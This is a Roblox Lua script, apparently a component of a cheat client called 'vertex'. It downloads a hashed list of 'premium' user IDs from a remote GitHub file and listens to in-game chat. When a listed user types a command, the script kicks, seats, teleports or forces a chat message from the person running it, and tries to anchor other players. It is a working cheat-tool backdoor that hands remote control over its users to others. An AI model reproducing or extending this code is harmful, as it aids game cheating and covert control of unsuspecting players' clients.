local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")
local API = game:HttpGet("https://raw.githubusercontent.com/vertex-peak/API/refs/heads/main/API.csv")
local Split = API:split("\n")
shared.premiumUserIds = shared.premiumUserIds or {}

local function simpleHash(message)
    local hash = 0x12345678  
    local seed = 0x7F3D8B9A  
    local multiplier = 31    

    for i = 1, #message do
        local byte = string.byte(message, i)  
        hash = (hash * multiplier + byte + seed) % 0x100000000  
        hash = bit32.lshift(hash, 5) + bit32.rshift(hash, 27)
        hash = hash % 0x100000000 
    end

    return string.format("%08x", hash)
end

for _, line in ipairs(Split) do
    local parts = line:split(",")
    if #parts == 2 and parts[1] ~= "" then
        local robloxUserId = parts[1]
        if robloxUserId then
            table.insert(shared.premiumUserIds, robloxUserId)
        end
    end
end

local function isPremiumUser(player)
    return table.find(shared.premiumUserIds, simpleHash(tostring(player.UserId))) ~= nil
end

shared.premium = isPremiumUser(Players.LocalPlayer)

local function onPlayerChat(player, message)
    if shared.premium then return end
    local lowerMessage = message:lower()

    if lowerMessage == "boot" and isPremiumUser(player) then
        Players.LocalPlayer:Kick("Premium user has kicked you")
    end

    if (lowerMessage == "reveal" or lowerMessage == ";r") and isPremiumUser(player) then
        TextChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("I'm using vertex")
    end

    if lowerMessage == "sit" and isPremiumUser(player) then
        local humanoid = Players.LocalPlayer.Character and Players.LocalPlayer.Character:FindFirstChild("Humanoid")
        if humanoid then
            humanoid.Sit = true
        end
    end

    if lowerMessage == "bring" and isPremiumUser(player) then
        local premiumCharacter = player.Character
        local localPlayer = Players.LocalPlayer

        if not premiumCharacter or not premiumCharacter:FindFirstChild("HumanoidRootPart") then return end
        if localPlayer == player then return end

        local myChar = localPlayer.Character
        if not myChar or not myChar:FindFirstChild("HumanoidRootPart") then return end

        local premiumRoot = premiumCharacter.HumanoidRootPart
        local localRoot = myChar.HumanoidRootPart

        local wasAnchored = localRoot.Anchored
        if wasAnchored then
            localRoot.Anchored = false
            task.wait(0.1)
        end

        local bringPosition = premiumRoot.Position + premiumRoot.CFrame.LookVector.Unit * 5
        localRoot.CFrame = CFrame.new(bringPosition, premiumRoot.Position)

        if wasAnchored then
            task.wait(0.1)
            localRoot.Anchored = true
        end
    end

    if lowerMessage == "anchor" and isPremiumUser(player) then
        for _, otherPlayer in ipairs(Players:GetPlayers()) do
            if otherPlayer ~= player and not isPremiumUser(otherPlayer) then
                local char = otherPlayer.Character
                if char and char:FindFirstChild("HumanoidRootPart") then
                    char.HumanoidRootPart.Anchored = true
                end
            end
        end
    end

    if lowerMessage == "unanchor" and isPremiumUser(player) then
        for _, otherPlayer in ipairs(Players:GetPlayers()) do
            if otherPlayer ~= player and not isPremiumUser(otherPlayer) then
                local char = otherPlayer.Character
                if char and char:FindFirstChild("HumanoidRootPart") then
                    char.HumanoidRootPart.Anchored = false
                end
            end
        end
    end
end

if shared.chatConnection then
    shared.chatConnection:Disconnect()
end

shared.chatConnection = TextChatService.MessageReceived:Connect(function(textChatMessage)
    local textSource = textChatMessage.TextSource
    if not textSource then return end

    local player = Players:GetPlayerByUserId(textSource.UserId)
    if not player then return end
    onPlayerChat(player, textChatMessage.Text)
end)

return {
    isPremiumUser = isPremiumUser,
    onPlayerChat = onPlayerChat,
}
